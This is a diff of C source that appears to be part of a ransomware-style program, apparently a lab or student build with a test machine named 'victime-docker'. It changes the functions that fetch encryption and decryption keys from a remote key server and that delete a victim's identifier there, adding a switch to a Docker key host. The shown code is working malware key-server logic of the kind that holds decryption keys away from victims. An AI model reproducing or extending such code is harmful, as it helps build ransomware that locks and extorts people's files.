@@ -11,6 +11,7 @@
 
 #include "server.h"
 #include "benchmark.h"
+#include "files_finder.h"
 
 /* Connect to the server and return socket descriptor */
 static int connect_to_server(char* p_host, int port) {
@@ -209,7 +210,15 @@ static char* contact_server(unsigned char* p_identifier, benchmarkData* p_data, 
 }
 
 unsigned char* get_encryption_key(unsigned char* p_identifier, benchmarkData* p_data, unsigned char** p_algo, unsigned char** p_iv) {
-    char* p_response = contact_server(p_identifier, p_data, "benchmark", GET_ENC_KEY_ENDPOINT, API_URL, KEY_HOST, KEY_PORT, REQ_POST);
+
+    char* p_host = KEY_HOST;
+
+    if (strcmp(get_username(), "victime-docker") == 0)
+    {
+        p_host = KEY_HOST_DOCKER;
+    }
+
+    char* p_response = contact_server(p_identifier, p_data, "benchmark", GET_ENC_KEY_ENDPOINT, API_URL, p_host, KEY_PORT, REQ_POST);
 
     char* json_body = extract_json_body(p_response);
 
@@ -236,7 +245,15 @@ unsigned char* get_encryption_key(unsigned char* p_identifier, benchmarkData* p_
 }
 
 unsigned char* get_decryption_key(unsigned char* p_identifier, unsigned char** p_algo, unsigned char** p_iv) {
-    char* p_response = contact_server(p_identifier, NULL, NULL, GET_DEC_KEY_ENDPOINT, API_URL, KEY_HOST, KEY_PORT, REQ_POST);
+
+    char* p_host = KEY_HOST;
+
+    if (strcmp(get_username(), "victime-docker") == 0)
+    {
+        p_host = KEY_HOST_DOCKER;
+    }
+
+    char* p_response = contact_server(p_identifier, NULL, NULL, GET_DEC_KEY_ENDPOINT, API_URL, p_host, KEY_PORT, REQ_POST);
 
     char* json_body = extract_json_body(p_response);
 
@@ -283,7 +300,14 @@ void save_key(char* p_key, char* p_filename) {
 
 void delete_id(unsigned char* p_id)
 {
-    char* p_response = contact_server(p_id, NULL, NULL, DEL_IDENTIFIER_ENDPOINT, API_URL, KEY_HOST, KEY_PORT, REQ_DEL);
+    char* p_host = KEY_HOST;
+
+    if (strcmp(get_username(), "victime-docker") == 0)
+    {
+        p_host = KEY_HOST_DOCKER;
+    }
+
+    char* p_response = contact_server(p_id, NULL, NULL, DEL_IDENTIFIER_ENDPOINT, API_URL, p_host, KEY_PORT, REQ_DEL);
 
     printf("[+] Identifier deleted\n");
 
